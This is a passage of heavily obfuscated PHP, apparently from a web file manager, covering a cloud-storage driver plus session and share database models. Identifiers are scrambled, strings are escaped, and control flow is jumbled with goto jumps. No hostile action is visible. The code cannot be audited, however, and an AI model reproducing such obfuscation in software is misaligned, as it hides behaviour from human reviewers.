"\142\x79\164\x65\163\75{$fäÚĞÔ«£í}\x2d{$EÚ«‡Î–ß¹}")); } public function upload($eÃÚµ›„ÛŸ, $C­ï¶ãËÚŠ, $Cœçà± Â = false, $eó›ÜÃ©Ö¸ = REPEAT_REPLACE) { $d‘ëßí¡ =& $_SERVER[¼€¼ˆ¦‚¡]; $E½¾Æëøº = array($d‘ëßí¡[196] => @md5_file($C­ï¶ãËÚŠ)); $C‡½œĞÓ”• = array($d‘ëßí¡[199] => get_file_mime(get_path_ext($eÃÚµ›„ÛŸ))); if (IO::size($C­ï¶ãËÚŠ) <= 1024 * 1024 * 200) { $F«ŠÕËª = $this->client->putObjectFile($C­ï¶ãËÚŠ, $this->bucket, $eÃÚµ›„ÛŸ, $d‘ëßí¡[185], $E½¾Æëøº, $C‡½œĞÓ”•); return !empty($F«ŠÕËª) ? $this->getPathOuter($eÃÚµ›„ÛŸ) : !1; } $E™ïÈ¥¥«¶ = $this->client->multiUploadObject($C­ï¶ãËÚŠ, $this->bucket, trim($eÃÚµ›„ÛŸ, $d‘ëßí¡[8]), $E½¾Æëøº, $C‡½œĞÓ”•); return $E™ïÈ¥¥«¶ ? $this->getPathOuter($eÃÚµ›„ÛŸ) : !1; } public function download($d‘»Ó˜ÏË–, $b–åù¬¿Àİ) { if (!@is_dir($this->pathFather($b–åù¬¿Àİ)) && !IO::mkdir($this->pathFather($b–åù¬¿Àİ))) { return !1; } $f„‹£Ş½« = $this->client->getObject($this->bucket, $d‘»Ó˜ÏË–, array(), $b–åù¬¿Àİ); return $f„‹£Ş½« !== !1 ? $b–åù¬¿Àİ : !1; } public function link($f¯Ö¹Ï¨¬å, $F°É‡Ê—÷¨ = array()) { $Aˆ ÁËåâø =& $_SERVER[¼€¼ˆ¦‚¡]; if ($this->signVer == $Aˆ ÁËåâø[200]) { return $this->client->getAuthenticatedURL($this->bucket, $f¯Ö¹Ï¨¬å, 3600 * 12, $F°É‡Ê—÷¨); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($f¯Ö¹Ï¨¬å, $Aˆ ÁËåâø[8]), 3600 * 12, $this->region, array(), !0, $F°É‡Ê—÷¨); } public function fileOut($f°Êİ’ÔÏ, $b¨±–ñì¹ó = false, $få…­İ‘ƒ = false, $c‡òØ‘á›† = '') { goto dß•¶í®“±; FÖÓË®‚Å: if ($cØ–°ƒà == $Aó¸Ùî‘æ³[201]) { return parent::fileOut($f°Êİ’ÔÏ, $b¨±–ñì¹ó, $få…­İ‘ƒ, $c‡òØ‘á›†); } $b¨±–ñì¹ó = $b¨±–ñì¹ó ? $Aó¸Ùî‘æ³[202] : $Aó¸Ùî‘æ³[203]; $d’ó ÷õ¿Ô = array($Aó¸Ùî‘æ³[204] => $b¨±–ñì¹ó . $Aó¸Ùî‘æ³[205] . rawurlencode($få…­İ‘ƒ), $Aó¸Ùî‘æ³[206] => $cØ–°ƒà); goto A¢òÒ¹¸Å; A¢òÒ¹¸Å: $a¡Å™¿Ó = $this->link($f°Êİ’ÔÏ, $d’ó ÷õ¿Ô); $this->fileOutLink($a¡Å™¿Ó); goto b¥·²ğÔé°; dß•¶í®“±: $Aó¸Ùî‘æ³ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$få…­İ‘ƒ) { $få…­İ‘ƒ = $this->pathThis($f°Êİ’ÔÏ); } $cØ–°ƒà = get_file_mime(get_path_ext($få…­İ‘ƒ)); goto FÖÓË®‚Å; b¥·²ğÔé°: } public function fileOutServer($Aæì£¤£ãì, $Aò‹¤•‰á• = false, $E¡’Ø“‹Í = false, $dÕ½ÛêÜ’ = '') { parent::fileOut($Aæì£¤£ãì, $Aò‹¤•‰á•, $E¡’Ø“‹Í, $dÕ½ÛêÜ’); } public function fileOutImage($f‚é‰ò—ñ, $a°õ·¥ôÑ‡ = 250) { $c°ëâøË¾Ş = $this->link($f‚é‰ò—ñ); $this->fileOutLink($c°ëâøË¾Ş); } public function fileOutImageServer($d‡äìÇãóî, $Eš´àí×Åñ = 250) { parent::fileOutImage($d‡äìÇãóî, $Eš´àí×Åñ); } public function hashMd5($B¦øŒ¹­Å¦, $dïöá•ƒ = '') { $a¿˜åÁê¿” =& $_SERVER[¼€¼ˆ¦‚¡]; $bÄÕ†êÌÁÌ = $this->objectMeta($B¦øŒ¹­Å¦); if (!$bÄÕ†êÌÁÌ) { return !1; } $dïöá•ƒ = $dïöá•ƒ ? $dïöá•ƒ : _get($bÄÕ†êÌÁÌ, $a¿˜åÁê¿”[207]); $dïöá•ƒ = $dïöá•ƒ ? $dïöá•ƒ : _get($bÄÕ†êÌÁÌ, $a¿˜åÁê¿”[197], $a¿˜åÁê¿”[33]); return $dïöá•ƒ; } public function uploadFormData($dõ¯Æ°²Œ, $a·Í…ºëÖ = 3600) { $B„‡Îâ¯–ª =& $_SERVER[¼€¼ˆ¦‚¡]; $e¡ã¯îÍÔ = $this->pathFather($dõ¯Æ°²Œ); $e´¸Ï¸¼§® = $this->client->getHttpUploadPostParams($this->bucket, $e¡ã¯îÍÔ, $B„‡Îâ¯–ª[185], $a·Í…ºëÖ); return array_merge((array) $e´¸Ï¸¼§®, array($B„‡Îâ¯–ª[169] => $this->getHost())); } public function multiUploadFormData($F¥®œé™²‰, $a·´Î‹ÜôÕ = 3600) { $aÄ±Öƒ¹å§ =& $_SERVER[¼€¼ˆ¦‚¡]; $eĞ«“ñÒ¬ = gmdate($aÄ±Öƒ¹å§[208]); $føŒÜ°éİÈ = array(); $fõ¶²¹ƒ… = $this->client->getUploadId($this->bucket, $F¥®œé™²‰, $føŒÜ°éİÈ); if (!$fõ¶²¹ƒ…) { return !1; } return array($aÄ±Öƒ¹å§[209] => $fõ¶²¹ƒ…, $aÄ±Öƒ¹å§[169] => $this->getHost() . $aÄ±Öƒ¹å§[8] . $this->pathEncode($F¥®œé™²‰), $aÄ±Öƒ¹å§[210] => $eĞ«“ñÒ¬, $aÄ±Öƒ¹å§[89] => $F¥®œé™²‰); } public function multiUploadAuthData($AèÖÁÆåá, $EÁ¦²ĞÌÄî = array()) { goto e»¨™ÏÎª; B‰¡¥‚©½£: $Cº¨³ËÈ = implode($Cƒöù½ê×[217], $C‹ïÉ‡È±); $DÈÎ¾Å£ÏŠ = base64_encode(hash_hmac($Cƒöù½ê×[218], $Cº¨³ËÈ, $this->secret, !0)); $eçÈÅ´¢„ = $Cƒöù½ê×[219] . $this->accessKey . $Cƒöù½ê×[4] . $DÈÎ¾Å£ÏŠ; goto cÛÇ¶ğÎÖø; cÛÇ¶ğÎÖø: if (strpos($FÂÔß¬ ù«, $Cƒöù½ê×[213]) === 0) { return array($Cƒöù½ê×[220] => $eçÈÅ´¢„, $Cƒöù½ê×[210] => $fÍ´£ñ²Ôö); } return $eçÈÅ´¢„; goto BÔæŠğÛƒ‡; e»¨™ÏÎª: $Cƒöù½ê× =& $_SERVER[¼€¼ˆ¦‚¡]; $fÍ´£ñ²Ôö = isset($EÁ¦²ĞÌÄî[$Cƒöù½ê×[210]]) ? $EÁ¦²ĞÌÄî[$Cƒöù½ê×[210]] : gmdate($Cƒöù½ê×[208]); $FÂÔß¬ ù« = isset($EÁ¦²ĞÌÄî[$Cƒöù½ê×[160]]) ? $EÁ¦²ĞÌÄî[$Cƒöù½ê×[160]] : $Cƒöù½ê×[33]; goto D’å©¬„Ä¡; D’å©¬„Ä¡: $Eƒ¡‰ëğÏº = $EÁ¦²ĞÌÄî[$Cƒöù½ê×[89]]; unset($EÁ¦²ĞÌÄî[$Cƒöù½ê×[89]]); if (isset($EÁ¦²ĞÌÄî[$Cƒöù½ê×[211]])) { $EÁ¦²ĞÌÄî[$Cƒöù½ê×[210]] = $fÍ´£ñ²Ôö; return $this->listUploadParts($Eƒ¡‰ëğÏº, $EÁ¦²ĞÌÄî); } goto FˆÙÓğ†»; FˆÙÓğ†»: $C‹ïÉ‡È± = array($Cƒöù½ê×[212], $Cƒöù½ê×[33], $Cƒöù½ê×[116], $Cƒöù½ê×[33], "\x78\x2d\x61\155\x7a\x2d\144\141\164\145\x3a{$fÍ´£ñ²Ôö}", $Cƒöù½ê×[8] . $this->bucket . $Cƒöù½ê×[8] . $this->pathEncode($Eƒ¡‰ëğÏº) . $FÂÔß¬ ù«); if (strpos($FÂÔß¬ ù«, $Cƒöù½ê×[213]) === 0) { $C‹ïÉ‡È±[0] = $Cƒöù½ê×[214]; } if (isset($EÁ¦²ĞÌÄî[$Cƒöù½ê×[215]]) && $EÁ¦²ĞÌÄî[$Cƒöù½ê×[215]] == $Cƒöù½ê×[216]) { $C‹ïÉ‡È±[0] = $Cƒöù½ê×[216]; } goto B‰¡¥‚©½£; BÔæŠğÛƒ‡: } public function listUploadParts($d¾§•™‹æŠ, $cË­Ç×¬ô† = array()) { goto Aîµ‰á¯Èù; Aìôøã°²æ: $bñ…Ôî’¥ = $this->multiUploadAuthData($d¾§•™‹æŠ, $cË­Ç×¬ô†); if (empty($bñ…Ôî’¥)) { return !1; } return array($A‰ñ³Ÿ±Â[220] => $bñ…Ôî’¥, $A‰ñ³Ÿ±Â[210] => $cË­Ç×¬ô†[$A‰ñ³Ÿ±Â[210]], $A‰ñ³Ÿ±Â[222] => $E®¦¢‰àÁ¢); goto Aœ‘—íˆèÔ; Aîµ‰á¯Èù: $A‰ñ³Ÿ±Â =& $_SERVER[¼€¼ˆ¦‚¡]; $D¨„¨í­¡ = str_replace($A‰ñ³Ÿ±Â[221], $A‰ñ³Ÿ±Â[33], $cË­Ç×¬ô†[$A‰ñ³Ÿ±Â[160]]); $E®¦¢‰àÁ¢ = $this->client->listParts($this->bucket, $d¾§•™‹æŠ, $D¨„¨í­¡); goto aŠ¥••Öê; aŠ¥••Öê: if (!$E®¦¢‰àÁ¢) { return !1; } unset($cË­Ç×¬ô†[$A‰ñ³Ÿ±Â[211]], $cË­Ç×¬ô†[$A‰ñ³Ÿ±Â[215]]); $cË­Ç×¬ô†[$A‰ñ³Ÿ±Â[89]] = $d¾§•™‹æŠ; goto Aìôøã°²æ; Aœ‘—íˆèÔ: } public function getHost() { return parent::getHost() . $_SERVER[¼€¼ˆ¦‚¡][8] . $this->bucket; } public function size($dˆÖÀ·Àùí) { $Ağ÷Ú‰ = $this->objectMeta($dˆÖÀ·Àùí); return $Ağ÷Ú‰ ? $Ağ÷Ú‰[$_SERVER[¼€¼ˆ¦‚¡][77]] : 0; } public function info($d¹İ¹‰ğŒ) { if ($this->isFolder($d¹İ¹‰ğŒ)) { return $this->folderInfo($d¹İ¹‰ğŒ); } else { if ($this->isFile($d¹İ¹‰ğŒ)) { return $this->fileInfo($d¹İ¹‰ğŒ); } } return !1; } public function exist($BÈœÁŠùØÔ) { return $this->isFile($BÈœÁŠùØÔ) || $this->isFolder($BÈœÁŠùØÔ); } public function isFile($B©‘¦ÕÕ³Œ) { return !$this->isFolder($B©‘¦ÕÕ³Œ) && $this->objectMeta($B©‘¦ÕÕ³Œ); } public function isFolder($dôÓ‰É÷’) { return $this->cacheMethod($_SERVER[¼€¼ˆ¦‚¡][223], $dôÓ‰É÷’); } protected function objectMeta($c¡ºù—Ã„) { return $this->cacheMethod($_SERVER[¼€¼ˆ¦‚¡][224], $c¡ºù—Ã„); } protected function _objectMeta($e‰­›Ûˆ¡–) { $b¡›ïîè¸† =& $_SERVER[¼€¼ˆ¦‚¡]; $e‰­›Ûˆ¡– = rtrim($e‰­›Ûˆ¡–, $b¡›ïîè¸†[8]); try { $C‹›“ïƒ‰‘ = $this->client->getObjectInfo($this->bucket, $e‰­›Ûˆ¡–); if (!isset($C‹›“ïƒ‰‘[$b¡›ïîè¸†[207]]) && isset($C‹›“ïƒ‰‘[$b¡›ïîè¸†[225]])) { $C‹›“ïƒ‰‘[$b¡›ïîè¸†[207]] = $C‹›“ïƒ‰‘[$b¡›ïîè¸†[225]]; } } catch (Exception $FïèÒ„ÅÉ‰) { $C‹›“ïƒ‰‘ = !1; } if (!$C‹›“ïƒ‰‘) { } return $C‹›“ïƒ‰‘; } protected function _isFolder($C‡¸­ƒÚ×˜) { goto BÛÑ¢èˆÄ; AˆòİÚÎ×­: $bÖ‚ÁÊ…‹Á = $this->client->getBucket($this->bucket, $C‡¸­ƒÚ×˜, null, 1); if (empty($bÖ‚ÁÊ…‹Á)) { return !1; } $bÖ‚ÁÊ…‹Á = array_values($bÖ‚ÁÊ…‹Á); goto EÌñœØ¢³Œ; BÛÑ¢èˆÄ: $a«î–ÊÏŒ  =& $_SERVER[¼€¼ˆ¦‚¡]; $C‡¸­ƒÚ×˜ = rtrim($C‡¸­ƒÚ×˜, $a«î–ÊÏŒ [8]); if ($C‡¸­ƒÚ×˜ == $a«î–ÊÏŒ [33] || $C‡¸­ƒÚ×˜ == $a«î–ÊÏŒ [8]) { return !0; } goto AˆòİÚÎ×­; EÌñœØ¢³Œ: if (substr($bÖ‚ÁÊ…‹Á[0][$a«î–ÊÏŒ [28]], -1) == $a«î–ÊÏŒ [8]) { return !0; } if (get_path_this($bÖ‚ÁÊ…‹Á[0][$a«î–ÊÏŒ [28]]) == get_path_this($C‡¸­ƒÚ×˜)) { return !1; } return !0; goto f¨°¸Èµ“Ã; f¨°¸Èµ“Ã: } } define($_SERVER[¼€¼ˆ¦‚¡][226], 1); goto E¿Ú“ùğ§µ; F×ÍæÖ³È: class SessionModel extends ModelBase { protected $tableName = "\163\171\163\164\x65\155\137\x73\x65\163\x73\151\x6f\156"; public function get($Bî¦·«¶¬ğ) { $DÒ•ÒÅª¿ =& $_SERVER[¼€¼ˆ¦‚¡]; $D–ã“‚ŞÑ = $this->where(array($DÒ•ÒÅª¿[2209] => $Bî¦·«¶¬ğ))->find(); if (!is_array($D–ã“‚ŞÑ)) { return !1; } return $D–ã“‚ŞÑ[$DÒ•ÒÅª¿[688]]; } public function set($c¸öÔ‹íùŒ, $Aä¦ÙİãÌÈ, $d˜é¤¬‹¯ç = 3600) { $FÅ æ¬³ =& $_SERVER[¼€¼ˆ¦‚¡]; $cÂé¬òô¸Û = array($FÅ æ¬³[2209] => $c¸öÔ‹íùŒ, $FÅ æ¬³[2135] => $Aä¦ÙİãÌÈ, $FÅ æ¬³[2210] => $d˜é¤¬‹¯ç + time()); if (Session::get($FÅ æ¬³[2211])) { $cÂé¬òô¸Û[$FÅ æ¬³[1437]] = Session::get($FÅ æ¬³[2211]); } else { $cÂé¬òô¸Û[$FÅ æ¬³[1437]] = 0; } if ($this->get($c¸öÔ‹íùŒ)) { return $this->where(array($FÅ æ¬³[2209] => $c¸öÔ‹íùŒ))->save($cÂé¬òô¸Û); } else { return $this->add($cÂé¬òô¸Û, array(), !0); } } public function remove($Fµ³¿Î±ŠÏ) { return $this->where(array($_SERVER[¼€¼ˆ¦‚¡][2209] => $Fµ³¿Î±ŠÏ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¼€¼ˆ¦‚¡][2212] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\x72\x65"; protected $dataAuto = array(array("\x6d\157\144\x69\x66\x79\x54\x69\x6d\x65", "\164\x69\155\x65", "\151\x6e\x73\145\162\x74\x2c\x75\x70\144\141\164\145", "\x66\165\156\x63\164\x69\157\156"), array("\143\x72\145\141\x74\x65\x54\151\155\145", "\164\151\155\x65", "\x69\156\163\145\x72\x74", "\146\165\x6e\143\x74\x69\x6f\x6e"), array("\x6f\x70\x74\x69\157\156\163", '', "\151\x6e\x73\x65\x72\x74\x2c\165\160\x64\x61\164\x65\54\163\x65\x6c\145\x63\164", "\152\163\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($e”Ø§çÑïˆ) { $eÓŠšöŒÀê =& $_SERVER[¼€¼ˆ¦‚¡]; $C¯„‰µòö = isset($e”Ø§çÑïˆ[0]) ? $e”Ø§çÑïˆ[0] : !1; return array($eÓŠšöŒÀê[2213] => array(USER_ID, $eÓŠšöŒÀê[2214]), $eÓŠšöŒÀê[2173] => array($C¯„‰µòö, $eÓŠšöŒÀê[2215])); } protected function listSimple() { $DŠĞ˜†¿ø„ = array($_SERVER[¼€¼ˆ¦‚¡][1437] => USER_ID); $c³½ïÅÈô¹ = $this->field($this->fieldList)->where($DŠĞ˜†¿ø„)->select(); return $c³½ïÅÈô¹ ? $c³½ïÅÈô¹ : array(); } protected function getInfo($FùÓë²èÚÖ, $AÊ½·› ë½ = false) { $E¢‚…ÛƒÀ =& $_SERVER[¼€¼ˆ¦‚¡]; if ($AÊ½·› ë½) { return $this->_getShareInfo(array($E¢‚…ÛƒÀ[441] => $FùÓë²èÚÖ)); } $c«ÙİĞ„” = $this->cacheFunctionGet($E¢‚…ÛƒÀ[2216], $FùÓë²èÚÖ); return $c«ÙİĞ„”; } public function getInfoByHash($fÆ‹Ş³Œñƒ) { return $this->_getShareInfo(array($_SERVER[¼€¼ˆ¦‚¡][443] => $fÆ‹Ş³Œñƒ)); } public function getInfoByPath($E÷ƒª„‡ ”) { $bŸƒªŸë—Ñ =& $_SERVER[¼€¼ˆ¦‚¡]; $Eà·ˆÖçº = array($bŸƒªŸë—Ñ[1437] => USER_ID, $bŸƒªŸë—Ñ[369] => $E÷ƒª„‡ ”); return $this->_getShareInfo($Eà·ˆÖçº); } public function getInfoBySourcePath($eÙ£İÌ‡Ïò) { $D´¨ĞÀ¿³ =& $_SERVER[¼€¼ˆ¦‚¡]; $A¶ëÉ°…Şö = array($D´¨ĞÀ¿³[1437] => USER_ID, $D´¨ĞÀ¿³[1018] => $eÙ£İÌ‡Ïò); return $this->_getShareInfo($A¶ëÉ°…Şö); } private function _getShareInfo($e¡•§íğÁ¾) { goto C¦…‘İå—®; aòë­Ä¸ˆ: if ($F™Ñ÷…ñ¾¯[$CÙÀˆ‡¦¶[369]] == $CÙÀˆ‡¦¶[468]) { $F™Ñ÷…ñ¾¯[$CÙÀˆ‡¦¶[391]] = IO::info($F™Ñ÷…ñ¾¯[$CÙÀˆ‡¦¶[1018]]); } else { $F™Ñ÷…ñ¾¯[$CÙÀˆ‡¦¶[391]] = Model($CÙÀˆ‡¦¶[1117])->pathInfo($F™Ñ÷…ñ¾¯[$CÙÀˆ‡¦¶[369]]); } $F™Ñ÷…ñ¾¯[$CÙÀˆ‡¦¶[2218]] = $aºÑñàøŠÎ; return $F™Ñ÷…ñ¾¯; goto eË‹ÅÖ¦‡®; C¦…‘İå—®: $CÙÀˆ‡¦¶ =& $_SERVER[¼€¼ˆ¦‚¡]; $F™Ñ÷…ñ¾¯ = $this->where($e¡•§íğÁ¾)->find(); if (!$F™Ñ÷…ñ¾¯) { return !1; } goto FÆĞŞÓ¡; FÆĞŞÓ¡: $e¡•§íğÁ¾ = array($CÙÀˆ‡¦¶[441] => $F™Ñ÷…ñ¾¯[$CÙÀˆ‡¦¶[441]]); $D½õÔÀªÍ = $CÙÀˆ‡¦¶[2217]; $aºÑñàøŠÎ = Model($CÙÀˆ‡¦¶[537])->order($CÙÀˆ‡¦¶[367])->field($D½õÔÀªÍ)->where($e¡•§íğÁ¾)->select(); goto aòë­Ä¸ˆ; eË‹ÅÖ¦‡®: } protected function getInfoAuth($E£…ˆ¯îå) { $aÚ‹¾Â½ÈÇ =& $_SERVER[¼€¼ˆ¦‚¡]; $DØòÜÊ¡® = $this->getInfo($E£…ˆ¯îå); $DØòÜÊ¡®[$aÚ‹¾Â½ÈÇ[376]] = Model($aÚ‹¾Â½ÈÇ[454])->authMake($DØòÜÊ¡®[$aÚ‹¾Â½ÈÇ[2218]]); return $DØòÜÊ¡®; } protected function listData($DÓÆ±Å´¸‰ = null, $DîŠ¥½Ğ¥î = 300) { $bÜÅéŒ³Ïì =& $_SERVER[¼€¼ˆ¦‚¡]; $A¡”ğ¾Ó¦ = array(array($bÜÅéŒ³Ïì[446] => array($bÜÅéŒ³Ïì[925], 0), $bÜÅéŒ³Ïì[448] => array($bÜÅéŒ³Ïì[925], 0), $bÜÅéŒ³Ïì[2219] => $bÜÅéŒ³Ïì[2187])); if ($DÓÆ±Å´¸‰ == $bÜÅéŒ³Ïì[1871]) { $A¡”ğ¾Ó¦ = array($bÜÅéŒ³Ïì[446] => 1); } else { if ($DÓÆ±Å´¸‰ == $bÜÅéŒ³Ïì[1007]) { $A¡”ğ¾Ó¦ = array($bÜÅéŒ³Ïì[448] => 1); } } $A¡”ğ¾Ó¦[$bÜÅéŒ³Ïì[1437]] = USER_ID; $fŸÂ»ÒÏøÀ = $this->where($A¡”ğ¾Ó¦)->selectPage($DîŠ¥½Ğ¥î); return $fŸÂ»ÒÏøÀ; } protected function listToMe($F‘é²…“É÷ = 300) { goto dÇŠä˜³ë‡; f‰˜Æ†òĞ¥: $dÕº“Ä”° = array_to_keyvalue_group($AŸÀæ¥ˆÌÖ[$FÇîÒÉ…¯[354]], $FÇîÒÉ…¯[441]); if (!$dÕº“Ä”°) { return $AŸÀæ¥ˆÌÖ; } $aéŸœÛ¦Ä½ = $FÇîÒÉ…¯[2221]; goto Cˆ¿”†¥ï°; Cˆ¿”†¥ï°: $eÛ©ª»½Œæ = array($FÇîÒÉ…¯[441] => array($FÇîÒÉ…¯[384], array_keys($dÕº“Ä”°))); $A¨†›Á¤® = $this->field($aéŸœÛ¦Ä½)->where($eÛ©ª»½Œæ)->select(); foreach ($A¨†›Á¤® as $Aß½È‘š => &$a³Øè¬Â²Ô) { $a³Øè¬Â²Ô[$FÇîÒÉ…¯[2218]] = $dÕº“Ä”°[$a³Øè¬Â²Ô[$FÇîÒÉ…¯[441]]]; } goto F»“ç¥‘ä; E†âÉ±òğ: $eÛ©ª»½Œæ = array($FÇîÒÉ…¯[521] => SourceModel::TYPE_USER, $FÇîÒÉ…¯[456] => USER_ID); if ($f©†ã·ÛøÁ) { $eÛ©ª»½Œæ = array(array($FÇîÒÉ…¯[521] => SourceModel::TYPE_USER, $FÇîÒÉ…¯[456] => USER_ID), array($FÇîÒÉ…¯[521] => SourceModel::TYPE_GROUP, $FÇîÒÉ…¯[456] => array($FÇîÒÉ…¯[7], $f©†ã·ÛøÁ)), $FÇîÒÉ…¯[2219] => $FÇîÒÉ…¯[2187]); } $AŸÀæ¥ˆÌÖ = Model($FÇîÒÉ…¯[537])->where($eÛ©ª»½Œæ)->selectPage($F‘é²…“É÷); goto f‰˜Æ†òĞ¥; F»“ç¥‘ä: $dó”×ˆŠõÁ = array($FÇîÒÉ…¯[2222] => $A¨†›Á¤®, $FÇîÒÉ…¯[2223] => $AŸÀæ¥ˆÌÖ[$FÇîÒÉ…¯[351]]); return $dó”×ˆŠõÁ; goto D°­¤óÓ•ƒ; dÇŠä˜³ë‡: $FÇîÒÉ…¯ =& $_SERVER[¼€¼ˆ¦‚¡]; $A©ø‘Ù“¸ = Session::get($FÇîÒÉ…¯[2220]); $f©†ã·ÛøÁ = array_to_keyvalue($A©ø‘Ù“¸, $FÇîÒÉ…¯[33], $FÇîÒÉ…¯[2105]); goto E†âÉ±òğ; D°­¤óÓ•ƒ: } protected function shareAdd($aÕ¸Îå˜, $B Ò¦‡‘¦®) { $aŞğ´äŠò« =& $_SERVER[¼€¼ˆ¦‚¡]; $cÆ²Ì“†åÜ = $this->_addShareData($aÕ¸Îå˜, $B Ò¦‡‘¦®); if (!empty($B Ò¦‡‘¦®[$aŞğ´äŠò«[2224]])) { $this->_shareAuthSet($cÆ²Ì“†åÜ, $B Ò¦‡‘¦®[$aŞğ´äŠò«[2224]]); } $this->shareEventAdd($aÕ¸Îå˜, $B Ò¦‡‘¦®, $aŞğ´äŠò«[1010]); return $cÆ²Ì“†åÜ; } private function shareEventAdd($E®óÑÑ¹Æ, $d…í·ïŒæ¶, $BŠİØ…–À = "\141\x64\x64") { goto aÇÀŠ «‚; E…Ò©î’Ã: return; goto D½¤–Š†‹; f¢¥Ÿ¿Ê: if ($a—Œ®ˆØÄ[$c±¶ˆ³—µà[448]] == $c±¶ˆ³—µà[468] && $d…í·ïŒæ¶[$c±¶ˆ³—µà[448]] == $c±¶ˆ³—µà[83]) { $eê‹í«È® = $c±¶ˆ³—µà[2226]; } if ($a—Œ®ˆØÄ[$c±¶ˆ³—µà[448]] == $c±¶ˆ³—µà[83] && $d…í·ïŒæ¶[$c±¶ˆ³—µà[448]] == $c±¶ˆ³—µà[468]) { $eê‹í«È® = $c±¶ˆ³—µà[2229]; } Model($c±¶ˆ³—µà[505])->eventShare($E®óÑÑ¹Æ, $eê‹í«È®); goto E…Ò©î’Ã; dÜù‰Æ‚‹ë: $eê‹í«È® = $c±¶ˆ³—µà[2227]; if ($a—Œ®ˆØÄ[$c±¶ˆ³—µà[446]] == $c±¶ˆ³—µà[468] && $d…í·ïŒæ¶[$c±¶ˆ³—µà[446]] == $c±¶ˆ³—µà[83]) { $eê‹í«È® = $c±¶ˆ³—µà[2225]; } if ($a—Œ®ˆØÄ[$c±¶ˆ³—µà[446]] == $c±¶ˆ³—µà[83] && $d…í·ïŒæ¶[$c±¶ˆ³—µà[446]] == $c±¶ˆ³—µà[468]) { $eê‹í«È® = $c±¶ˆ³—µà[2228]; } goto f¢¥Ÿ¿Ê; aÇÀŠ «‚: $c±¶ˆ³—µà =& $_SERVER[¼€¼ˆ¦‚¡]; if ($BŠİØ…–À == $c±¶ˆ³—µà[1010]) { if ($d…í·ïŒæ¶[$c±¶ˆ³—µà[446]] == $c±¶ˆ³—µà[83]) { Model($c±¶ˆ³—µà[505])->eventShare($E®óÑÑ¹Æ, $c±¶ˆ³—µà[2225]); } if ($d…í·ïŒæ¶[$c±¶ˆ³—µà[448]] == $c±¶ˆ³—µà[83]) { Model($c±¶ˆ³—µà[505])->eventShare($E®óÑÑ¹Æ, $c±¶ˆ³—µà[2226]); } return; } $a—Œ®ˆØÄ = $this->getInfoByPath($E®óÑÑ¹Æ); goto dÜù‰Æ‚‹ë; D½¤–Š†‹: } private function _addShareData($bÚŒç™…Ù«, $A×ß…É–ì˜ = array()) { goto c¾‰îö„¡’; B²©ÕèÎôÔ: $C˜³ÙŸäÚ¨ = array($bæìšÅ£ò[1428] => USER_ID, $bæìšÅ£ò[383] => $bÚŒç™…Ù«, $bæìšÅ£ò[1342] => $bæìšÅ£ò[33], $bæìšÅ£ò[446] => 0, $bæìšÅ£ò[448] => 0, $bæìšÅ£ò[1018] => $bæìšÅ£ò[33], $bæìšÅ£ò[295] => $bæìšÅ£ò[33], $bæìšÅ£ò[801] => $bæìšÅ£ò[33], $bæìšÅ£ò[2231] => 0, $bæìšÅ£ò[2232] => 0, $bæìšÅ£ò[699] => 0, $bæìšÅ£ò[2233] => $bæìšÅ£ò[33], $bæìšÅ£ò[443] => $bæìšÅ£ò[33]); $f”­á¦È … = explode($bæìšÅ£ò[47], $bæìšÅ£ò[2234]); foreach ($f”­á¦È … as $Fë«¬®òŠ) { if (!isset($A×ß…É–ì˜[$Fë«¬®òŠ])) { continue; } $C˜³ÙŸäÚ¨[$Fë«¬®òŠ] = $A×ß…É–ì˜[$Fë«¬®òŠ]; } goto f‘ÁÙæòÑõ; f‘ÁÙæòÑõ: $fÚ÷àæ„… = $this->add($C˜³ÙŸäÚ¨); $A–Ç·õÛÅ¨ = array($bæìšÅ£ò[443] => short_id($fÚ÷àæ„…)); $this->where(array($bæìšÅ£ò[440] => $fÚ÷àæ„…))->save($A–Ç·õÛÅ¨); goto DŞöÁ¸‹Ã²; DŞöÁ¸‹Ã²: return $fÚ÷àæ„…; goto D‘ñÕ•ÜÚ; AŒ³™Í×Á®: if ($F¾¹æÁÜŒê = $this->where($aó§µÏ›âï)->find()) { return $F¾¹æÁÜŒê[$bæìšÅ£ò[441]]; } if ($bÚŒç™…Ù« == 0) { $d÷¼§óÅå¤ = array($bæìšÅ£ò[28] => get_path_this($A×ß…É–ì˜[$bæìšÅ£ò[75]])); } else { $d÷¼§óÅå¤ = Model($bæìšÅ£ò[749])->sourceInfo($bÚŒç™…Ù«); if (!$d÷¼§óÅå¤) { return !1; } } if (!$A×ß…É–ì˜[$bæìšÅ£ò[1342]]) { $A×ß…É–ì˜[$bæìšÅ£ò[1342]] = $d÷¼§óÅå¤[$bæìšÅ£ò[28]]; } goto B²©ÕèÎôÔ; c¾‰îö„¡’: $bæìšÅ£ò =& $_SERVER[¼€¼ˆ¦‚¡]; $aó§µÏ›âï = array($bæìšÅ£ò[383] => $bÚŒç™…Ù«, $bæìšÅ£ò[1428] => USER_ID); if ($bÚŒç™…Ù« == 0) { $aó§µÏ›âï = array($bæìšÅ£ò[2230] => $A×ß…É–ì˜[$bæìšÅ£ò[1018]], $bæìšÅ£ò[1428] => USER_ID); } goto AŒ³™Í×Á®; D‘ñÕ•ÜÚ: } private function _shareAuthSet($CªÆ”¿¦©, $b…ĞÖ¶¨ë) { goto bôŸÊŒÛ×; bôŸÊŒÛ×: $e÷Ó¯ÒîĞ¯ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!is_array($b…ĞÖ¶¨ë)) { return !1; } $dÔñ±¤‘× = Model($e÷Ó¯ÒîĞ¯[2235]); goto Dà¥œŠææí; F¦ÚéòÛŒ‹: return $dÔñ±¤‘×->addAll($FÓˆÒ½ğï…, array(), !0); goto F¶ù·ÁÓ×†; Dà¥œŠææí: $dÔñ±¤‘×->where(array($e÷Ó¯ÒîĞ¯[441] => $CªÆ”¿¦©))->delete(); $FÓˆÒ½ğï… = array(); foreach ($b…ĞÖ¶¨ë as $e¡‡Êì×‚˜) { $aÔ…É‰ØÍé = SourceModel::TYPE_USER; if ($e¡‡Êì×‚˜[$e÷Ó¯ÒîĞ¯[371]] == SourceModel::TYPE_GROUP) { $aÔ…É‰ØÍé = SourceModel::TYPE_GROUP; } $dõ¾Šßô„¬ = array($e÷Ó¯ÒîĞ¯[441] => $CªÆ”¿¦©, $e÷Ó¯ÒîĞ¯[371] => 